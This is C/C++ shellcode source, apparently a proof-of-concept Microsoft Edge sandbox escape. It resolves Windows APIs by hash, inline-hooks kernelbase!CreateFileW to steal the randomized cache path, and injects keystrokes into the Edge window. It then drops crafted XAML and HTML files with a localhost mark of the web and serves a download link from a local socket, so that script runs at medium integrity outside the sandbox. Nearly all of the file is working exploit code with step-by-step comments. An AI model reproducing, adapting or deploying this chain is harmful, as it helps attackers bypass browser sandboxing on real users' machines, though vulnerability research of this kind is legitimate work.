#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <stddef.h>
#include <iostream>
#include <ShlObj.h>
#include <shlguid.h>
#include <stdio.h>
#include "stdafx.h"
#include <WinInet.h>
#pragma comment(lib, "ws2_32.lib")

#pragma comment(lib, "wininet.lib")


static HANDLE hThread = NULL;
static SOCKET serverSk = INVALID_SOCKET;


_inline PEB *getPEB() {
	PEB *p;
	__asm {
		mov     eax, fs:[30h]
		mov     p, eax
	}
	return p;
}

DWORD getHash(const char *str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << (32 - 13));       
		h += *str >= 'a' ? *str - 32 : *str;    
		str++;
	}
	return h;
}

DWORD getFunctionHash(const char *moduleName, const char *functionName) {
	return getHash(moduleName) + getHash(functionName);
}

LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
	int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
}

PVOID getProcAddrByHash(DWORD hash) {
	PEB *peb = getPEB();
	LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY *ptr = first;
	do {                           
		LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
		ptr = ptr->Flink;

		BYTE *baseAddress = (BYTE *)dte->DllBase;
		if (!baseAddress)           
			continue;
		IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
		IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader->e_lfanew);
		DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (!iedRVA)                
			continue;
		IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
		char *moduleName = (char *)(baseAddress + ied->Name);
		DWORD moduleHash = getHash(moduleName);

		DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
		for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
			char *functionName = (char *)(baseAddress + nameRVAs[i]);
			if (hash == moduleHash + getHash(functionName)) {
				WORD ordinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
				DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
				return baseAddress + functionRVA;
			}
		}
	} while (ptr != first);

	return NULL;         
}

#define HASH_CreateFileA 0x88aad5ac
#define HASH_VirtualProtect             0x862f81fa

#define HASH_Sleep 0x8590ba7
#define HASH_CreateFileW 0xec0da1c4


#define HASH_CloseHandle 0x1ca655f1
#define HASH_MoveFileA 0xd0b0475b
#define HASH_WriteFile 0x54b43706


#define HASH_GetWindow                0x997a8c29
#define HASH_PostMessageW         0x4c91c5fb
#define HASH_FindWindowA        0xcc926bd
#define HASH_WSAStartup 0x2ddcd540
#define HASH_socket 0x3b0ef2e4
#define HASH_setsockopt 0x91b4d662
#define HASH_inet_addr 0x11bfae2
#define HASH_bind 0xb952022a
#define HASH_listen 0xdb0e951a
#define HASH_accept 0x3b66315b
#define HASH_recv 0xd8fa013c
#define HASH_closesocket 0x4b255d55
#define HASH_strncpy 0x5244f578
#define HASH_send 0xdb52012a
#define HASH_SHGetFolderPathA 0xba1a3550

#define htons(A) ((((WORD)(A) & 0xff00) >> 8) | (((WORD)(A) & 0x00ff) << 8))
#define DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
#define MAKEWORD(a, b)      ((WORD)(((BYTE)(((DWORD_PTR)(a)) & 0xff)) | ((WORD)((BYTE)(((DWORD_PTR)(b)) & 0xff))) << 8))
//***************************************************************************************************************
//EVERYTHING ABOVE THIS LINE IS ONLY USED TO GET FUNCTION ADDRESSES AT RUNTIME...THE REAL SHELLCODE STARTS BELOW
//***************************************************************************************************************
void Hook(void * toHook, int len) {
	
	//This function is used to hook kernelbase!CreatefileW, Nothing more.
	
	DWORD pointer;
	__asm { //This inline assembly will get the current EIP address. We are adding a jmp instruction to redirect kernelbase!createfileW to line 361, this is where our logic starts to grab the randomized cache location
		call delta
		delta :
		pop ebx
		sub ebx,0x129//CHANGE ME WHEN ADDING CODE, calculation: DELTA - PUSH EAX PUSH ECX (line 361) 
		mov pointer, ebx
		
	}

	DefineFuncPtr(VirtualProtect);
	DWORD curProtection;
	My_VirtualProtect(toHook, len, PAGE_EXECUTE_READWRITE, &curProtection); //Make sure we can overwrite kernelbase!createfilew with our jmp instruction. As by default we cannot write into the code segment
	
	DWORD relativeAddress = (pointer - (DWORD)toHook) - 5;
	*(BYTE*)toHook = 0xE9;
	*(DWORD*)((DWORD)toHook + 1) = relativeAddress;
	DWORD temp;
	My_VirtualProtect(toHook, len, curProtection, &temp);

}

//Used for our socket
static int send_all(SOCKET sk, char *buffer, int size)
{

	DefineFuncPtr(send);
	int len;
	while (size > 0) {
		len = My_send(sk, buffer, size, 0);
		buffer += len;
		size -= len;
	}

	return 1;
}


int entryPoint() {

	DefineFuncPtr(CreateFileA);
	DefineFuncPtr(Sleep);
	DefineFuncPtr(SHGetFolderPathA);
	DefineFuncPtr(CloseHandle);
	DefineFuncPtr(MoveFileA);
	DefineFuncPtr(WriteFile);
	DefineFuncPtr(FindWindowA);
	DefineFuncPtr(GetWindow);
	DefineFuncPtr(PostMessageW);
	DefineFuncPtr(strncpy);
	DefineFuncPtr(WSAStartup);
	DefineFuncPtr(socket);
	DefineFuncPtr(inet_addr);
	DefineFuncPtr(bind);
	DefineFuncPtr(listen);
	DefineFuncPtr(accept);
	DefineFuncPtr(recv);
	DefineFuncPtr(closesocket);
	BYTE *hookfunc = (BYTE*)getProcAddrByHash(HASH_CreateFileW); //Because we are hooking kernelbase!CreateFileW, we need to get the address in runtime 
	DWORD jmpback;

	//jmpback, after we finish with our hooking callback, we ofcourse need to jump back into kernbalse!createfilew and resume normal execution flow..

	jmpback = (DWORD)hookfunc + 5;


	DefineFuncPtr(VirtualProtect);
	DWORD curProtection;

	void* overwrite;
	__asm //This segment is used to overwrite jmp __end at line 378, and replace it with jmpback.
	{
		call deltab //We call label deltab to get current address, so we can properly use relative offsets
		deltab :
		pop ebx
			lea ebx, [ebx + 0x644] //CHANGE ME  jmp short+2  - DELTAB 
			mov overwrite, ebx 
	}
	My_VirtualProtect(overwrite, 30, PAGE_EXECUTE_READWRITE, &curProtection); //Making the code segment writable..
	DWORD relativeAddress = (jmpback - (DWORD)overwrite) - 5; //jmpback is the location in kernelbase!createfilew where we resume: overwrite - 5, is the jmp __end label.
	*(BYTE*)overwrite = 0xE9; 
	*(DWORD*)((DWORD)overwrite + 1) = relativeAddress; //Replace jmp __end with jumpback
	Hook(hookfunc, 5); //At this line we jump to our hook function to overwrite kernelbase!createfilew with our jmp instruction. So we can redirect execution flow and grab the randomized cache location. 
	//note: We do this by hooking because the cache location we need, is not from microsoftedgecp.exe but microsoftedge.exe, we cannot enumerate this cache using GetUrlCacheEntryInfo or something similar.
	//So my solution was to hook kernelbase!createfileW, create a filter with inline asm to check we are getting the right filepath (because obviously createfilew gets triggered multiple times, and we need to get the right one) and grab the randomized cache location this way.
	
   //The following code is used to simulate key input to the edge window..this is to trigger the link on the staging page, to open our initial xaml and get a cached version.

	HWND frame = My_FindWindowA("ApplicationFrameWindow", NULL); //gets the top edge window
	HWND frame2 = My_GetWindow(frame, 5); //We iterate all the way down to our sandboxed window, its not a very clean way, but its the easiest way without using functions that use annoying callbacks.
	frame2 = My_GetWindow(frame2, 2);
	frame = frame2;
	frame2 = My_GetWindow(frame, 5);
	frame = frame2;
	frame2 = My_GetWindow(frame, 2);
	frame = frame2;
	frame2 = My_GetWindow(frame, 5);
	frame = frame2;
	frame2 = My_GetWindow(frame, 5);
	frame = frame2;
	frame2 = My_GetWindow(frame, 5);
	frame = frame2;
	My_PostMessageW(frame2, 0x0100, 0x9, NULL); //sending tab + enter to activate the link on our staging page
	My_PostMessageW(frame2, 0x0101, 0x9, NULL);
	My_PostMessageW(frame2, 0x0100, 0x0D, NULL);
	My_PostMessageW(frame2, 0x0101, 0x0D, NULL);

	char p1[MAX_PATH];
	char p2[MAX_PATH];
	char p3[MAX_PATH];
char *path1 = p1;
char *path2 = p2;
char *path3 = p3;

	My_SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, path1); //We get c:\users\%username% three times, because we need to construct three different file paths. 
	My_SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, path2);
	My_SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, path3);
	char test[] = "\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cache\\REPLACEM\\test.xaml"; //Take note of REPLACEM, this will later be replaced with the randomized cache location
	char test2[] ="\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\temp\\test.xaml"; //This filepath is used to copy the above file to this location.
	char test3[] ="\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\temp\\test.html"; //This is used to create an html file for the frame in our above file.


	My_Sleep(5000);
	__asm { //Ok, this piece of asm is very easy, after we used our createfilew hook to drop the randomized cache location into the bunch of nops you see further in the code, we simply use this to replace "REPLACEM" in char test[]. Simple as that!
		call deltad
		deltad:
		pop ecx
		lea ecx, [ecx+0x4c1] //CHANGE ME, POINT TO DROPPED VALUES (START OF NOP + 12 BYTES...or something)
		push eax	
		mov al, [ecx]  //COULD PROBABLY USE A REP INSTRUCTION HERE....BUT I'M A SCRIPTKIDDIE
		mov test[85],al
		mov al, [ecx+1]
		mov test[86], al
		mov al, [ecx+2]
		mov test[87], al
		mov al, [ecx+3]
		mov test[88], al
		mov al, [ecx+4]
		mov test[89], al
		mov al, [ecx+5]
		mov test[90], al
		mov al, [ecx+6]
		mov test[91], al
		mov al, [ecx+7]
		mov test[92], al
	}
	strcat(path1, test); //We append c:\users\%username%\ with the rest of the filepath. Since we don't know the username of our victim, we had to use SHGetFolderPathA ... and here we simply construct our final filepaths.
	strcat(path2, test2); 
	strcat(path3, test3); 
	HANDLE hfile;
	HANDLE hfile2;
	char DataBuffer[] = "<!-- saved from url=(0016)http://localhost --><Page xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"><Frame Source=\"test.html\"></Frame></Page> "; //The xaml file with mandatory medium, after we move it into \\AC\\#!001\\temp\\test.xaml, we simply write this into it. We do add MOTW pointing to localhost. But this is only needed to render the xaml file in IE, as other zones restrict this. I don't think MOTW will be mitigated anytime soon, as this will break alot of backward compatibility. But using MOTW is not the rootcause of this vulnerability I believe..and it does not leverage the localhost zone as much as we saw in my previous edge sandbox vulnerability, or even the zdi localhost IE PM bypass (this will also work with IE11 in epm).
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	char DataBuffer2[] = "<html><body><script>alert(\"medium IL javascript\");</script></body></html>"; //Buffer for the html file that is going to be used as a frame..as you can see, we don't even need MOTW here..and according to IE, the frame is rendered inside the internet zone....but outside the sandbox...which is pretty cool!
	DWORD dwBytesToWrite2 = (DWORD)strlen(DataBuffer2);
	DWORD dwBytesWritten2 = 0;
	BOOL bErrorFlag2 = FALSE;

	hfile=	My_CreateFileA(path1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //First we do a createfile call with create_always to get rid of MOTW, since this file came from the internetzone
	My_WriteFile(hfile,DataBuffer,dwBytesToWrite,&dwBytesWritten,NULL);   //And we write our new xaml code into it

	hfile2= My_CreateFileA(path3, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //We create the html file that is going to be included as a frame in our xaml file.
	My_WriteFile(hfile2,DataBuffer2,dwBytesToWrite2,&dwBytesWritten2,NULL);          

	 My_CloseHandle(hfile);
	 My_CloseHandle(hfile2);
	 My_MoveFileA(path1, path2); //Move the xaml file from the microsoftedge.exe cache location, to the same folder as our html file

	 //We simply create a socket, that will be accessible on 127.0.0.1:5555
	WSADATA wsaData;
	 My_WSAStartup(MAKEWORD(2, 2), &wsaData);
	 SOCKET peerSk = NULL;
	char buffer[] = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 170\r\n\r\n<html><body><a href=\"                                                                                                                                  \" download>blah</a></body></html>"; //use the whitespace to insert our path...
	//This buffer is important, it has alot of whitespaces that will be replaced with the location of our xaml file. Also notice the download attribute, this is used to access the filesystem from the internet zone.
	char compare[2] = "\x00";
	int count = 0;

	while (path2[count] != compare[2]) //Some logic so that we can have different sized username..
	{
		count++;
	}
	My_strncpy(&buffer[86], path2, count); //copy our filepath into the whitespaces of buffer[]..ofcourse if the username is still very long..we might not have enough whitespaces..so please keep that in mind.																										
	char placeholder[512];
	char *ip = "127.0.0.1";
	struct sockaddr_in skAddr;
	 SOCKET serverSk = NULL;
	 serverSk = My_socket(2, 1, 0);
	 memset(&skAddr, 0, sizeof(skAddr));
	 skAddr.sin_family = 2;
	 skAddr.sin_port = htons(5555);
	 skAddr.sin_addr.s_addr = My_inet_addr(ip);
	 My_bind(serverSk, (sockaddr *)&skAddr, sizeof(skAddr));
	 My_listen(serverSk, 0);
	 peerSk = My_accept(serverSk, NULL, NULL);
	 send_all(peerSk, buffer, 300);
	 My_recv(peerSk, placeholder, 512, 0); //The above is just some logic to create the socket server.
	 My_Sleep(1000);
	 My_PostMessageW(frame2, 0x0100, 0x9, NULL); //We activate the link on the custom html page that we just created in the above lines. 
	 My_PostMessageW(frame2, 0x0101, 0x9, NULL);
	 My_PostMessageW(frame2, 0x0100, 0x0D, NULL);
	 My_PostMessageW(frame2, 0x0101, 0x0D, NULL);

	while (true) //This is the end of our code....all the rest below is used as a callback for our hook
	{
		My_Sleep(100);
	}
	__asm { //Code below is used each time we hit kernelbase!createfilew..alot of deltas are used that need to be recalculated manually each time this code is changed, even if its only a byte...
	interrupc: //If the filepath starts with c: we jump to this label
	lea eax, [eax+0x1]
	cmp dword ptr [eax],0x00610043 //We check if our filepath contains the letters "AC", to make sure we have the correct filepath...if the username has AC in it, ofcourse this filter will break..but this seems like a low probability...and you could easily make this filter a bit longer.
	jne interrupc //If it did not contain it, we loop to the next byte
	lea eax,[eax+0xc] //Once we hit "AC", we add + 0xc to the string to get the location of our 8-letter randomized cache name
	call deltac //Again, get the current address of EIP
	deltac:
	pop ecx
	lea ecx, [ecx+0x69]      //change me GO TO NOPS   //This is the location where we save our 8-letter randomized cache name
	cmp [ecx],0x90 //Make sure it contains a nop, otherwise it is already overwritten with our cache location and we should continue.
	jne cont
	push ebx
	mov bl, [eax]  //The rest is plain simple, moving our cache location into the nops.
	mov [ecx], bl
	mov bl, [eax+2]
	mov [ecx+1],bl
	mov bl, [eax+4]
	mov[ecx+2], bl
	mov bl, [eax + 6]
	mov[ecx+3], bl
	mov bl, [eax+8]
	mov[ecx+4], bl
	mov bl, [eax + 10]
	mov[ecx + 5], bl
	mov bl, [eax + 12]
	mov[ecx+6], bl
	mov bl, [eax + 14]
	mov[ecx + 7], bl
	pop ebx
	cmp eax, eax
	je cont
	push eax  //START OF HOOK CALLBACK...!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Save some registers so we don't crash later on.
	push ecx
		
	lea eax, [ebp + 0xc] //Get the filepath agrument of createfilew
	mov ecx, [eax]
	cmp ch, 0x00 //We compare it with 00, if this matches, its not the filepath we need, and we simply continue.
	je cont
	mov ecx, 0x003a0043 //If the previous statement did not match, lets see if our filepath starts with c:
	mov eax,[eax]
	cmp[eax], ecx
	je interrupc //if the filepath starts with c: we jump to label interrupc (don't mind the weird label names..they don't make alot of sense, was using alot of int 3  instructions for debugging purposes hence the name..:D)
	cont :
	pop ecx
	pop eax
	mov edi,edi
	push ebp
	mov ebp, esp
	jmp __end  //WE OVERWRITE THIS JUMP INSRUCTION IN RUNTIME! 
	nop //Not very efficient...but what the hell, lets overwrite some nops with some data for use later...need to write data in code because we cannot use relative offsets in our main code as its probably a seperate thread (since we are hooking kernelbase!createfilew)...and you know...aslr :D
	nop //note to self: we don't really need this many nops...
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	}


__end:
	
//	My_ExitThread(0);
	return 0;

}

int main() {
//	DWORD hash = getFunctionHash("MSVCRT.DLL", "strncpy");
//	printf("%x\n", hash);

	return entryPoint();
}


